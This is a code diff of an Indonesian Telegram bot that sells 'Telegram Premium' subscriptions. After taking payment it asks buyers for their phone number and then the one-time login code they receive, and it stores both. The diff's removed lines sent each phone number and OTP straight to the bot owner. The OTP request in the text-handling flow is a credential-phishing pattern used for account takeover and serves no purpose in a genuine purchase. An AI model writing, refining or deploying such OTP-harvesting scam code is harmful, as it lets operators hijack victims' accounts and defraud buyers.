@@ -43,7 +43,6 @@ metode_pembayaran = [
 user_data_store = {}
 
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    # Pesan welcome
     teks = (
         "👑 𝑾𝒆𝒍𝒄𝒐𝒎𝒆 𝒕𝒐 𝑺𝒓𝒑𝒂𝑷𝒓𝒆𝒎 👑\n\n"
         "✨ 𝐓𝐄𝐋𝐄𝐏𝐑𝐄𝐌 𝐌𝐔𝐑𝐀𝐇 & 𝐓𝐄𝐑𝐏𝐄𝐑𝐂𝐀𝐘𝐀 ✨\n\n"
@@ -54,12 +53,10 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "✅ 𝙎𝙪𝙙𝙖𝙝 𝙏𝙚𝙧𝙗𝙪𝙠𝙩𝙞 𝙏𝙧𝙪𝙨𝙩𝙚𝙙\n\n"
         "📩 𝑶𝒓𝒅𝒆𝒓 𝒔𝒆𝒌𝒂𝒓𝒂𝒏𝒈, 𝒋𝒂𝒏𝒈𝒂𝒏 𝒕𝒖𝒏𝒈𝒈𝒖 𝒃𝒆𝒔𝒐𝒌!\n"
     )
-
-    # Daftar produk
     teks += "📦 Daftar Produk:\n\n"
     for p in produk_list:
         teks += f"{p['id']}. {p['nama']} - Rp {p['harga']:,} ✨\n"
-    
+
     keyboard = [
         [InlineKeyboardButton("🛒 Beli Disini", callback_data="beli")],
         [InlineKeyboardButton("📞 CS", url="t.me/serpagengs"),
@@ -79,12 +76,7 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await query.edit_message_text("Pilih paket premium yang ingin dibeli:", reply_markup=InlineKeyboardMarkup(keyboard))
         return KONFIRMASI
 
-    elif data == "cs":
-        await query.edit_message_text("Hubungi CS: @serpagengs", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("⬅️ Kembali", callback_data="start")]]))
-        return PILIH_BULAN
-
-    elif data == "testi":
-        await query.edit_message_text("Lihat testimoni: https://t.me/srpatesti", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("⬅️ Kembali", callback_data="start")]]))
+    elif data == "cs" or data == "testi":
         return PILIH_BULAN
 
     elif data == "start":
@@ -123,6 +115,9 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await query.edit_message_text("Silakan kirim bukti transfer berupa foto.")
         return KIRIM_BUKTI
 
+    elif data.startswith("owner_"):
+        return await handle_owner_response(update, context)
+
 async def handle_media(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.message.from_user.id
     if update.message.photo:
@@ -149,11 +144,11 @@ async def handle_owner_response(update: Update, context: ContextTypes.DEFAULT_TY
     uid = int(uid)
 
     if action == "konfirmasi":
-        await context.bot.send_message(chat_id=uid, text="✅ Terima Kasih Pembayaran dikonfirmasi.\nSilakan kirim nomor HP nya kak.")
-        await context.bot.send_message(chat_id=OWNER_ID, text=f"📱 No HP dari @{update.message.from_user.username or uid} telah dikonfirmasi.")
+        await context.bot.send_message(chat_id=uid, text="✅ Pembayaran kamu dikonfirmasi.\nSilakan kirim nomor HP.")
+        await context.bot.send_message(chat_id=OWNER_ID, text=f"Konfirmasi dikirim ke @{uid}")
         return INPUT_NOHP
     else:
-        await context.bot.send_message(chat_id=uid, text="❌ Bukti ditolak. Kirim ulang.")
+        await context.bot.send_message(chat_id=uid, text="❌ Bukti transfer ditolak. Kirim ulang ya.")
         return KIRIM_BUKTI
 
 async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -162,14 +157,12 @@ async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     if "nohp" not in user_data_store[uid]:
         user_data_store[uid]["nohp"] = text
-        await update.message.reply_text("✅ Nomor HP diterima, silakan kirim OTP yang telah Anda terima.")
-        await context.bot.send_message(chat_id=OWNER_ID, text=f"📱 Nomor HP {text} dari @{update.message.from_user.username}")
+        await update.message.reply_text("✅ Nomor HP diterima. Silakan kirim OTP yang Anda terima.")
         return INPUT_OTP
 
     if "otp" not in user_data_store[uid]:
         user_data_store[uid]["otp"] = text
         await update.message.reply_text("✅ OTP diterima. Menunggu verifikasi.")
-        await context.bot.send_message(chat_id=OWNER_ID, text=f"📲 OTP {text} dari @{update.message.from_user.username}")
         return INPUT_VERIFIKASI
 
     return ConversationHandler.END
@@ -183,17 +176,20 @@ def main():
             PILIH_BULAN: [CallbackQueryHandler(button_handler)],
             KONFIRMASI: [CallbackQueryHandler(button_handler)],
             METODE_BAYAR: [CallbackQueryHandler(button_handler)],
-            KIRIM_BUKTI: [MessageHandler(filters.PHOTO, handle_media)],
-            INPUT_NOHP: [MessageHandler(filters.TEXT, handle_text)],
-            INPUT_OTP: [MessageHandler(filters.TEXT, handle_text)],
-            INPUT_VERIFIKASI: [MessageHandler(filters.TEXT, handle_text)],
+            KIRIM_BUKTI: [
+                CallbackQueryHandler(button_handler),
+                MessageHandler(filters.PHOTO, handle_media)
+            ],
+            INPUT_NOHP: [MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text)],
+            INPUT_OTP: [MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text)],
+            INPUT_VERIFIKASI: [MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text)],
         },
-        fallbacks=[],
+        fallbacks=[CommandHandler("start", start)],
+        allow_reentry=True
     )
 
     application.add_handler(conv_handler)
-    application.add_handler(CallbackQueryHandler(handle_owner_response, pattern=r"^(owner_konfirmasi|owner_tolak)_\d+$"))
     application.run_polling()
 
-if __name__ == '__main__':
+if __name__ == "__main__":
     main()
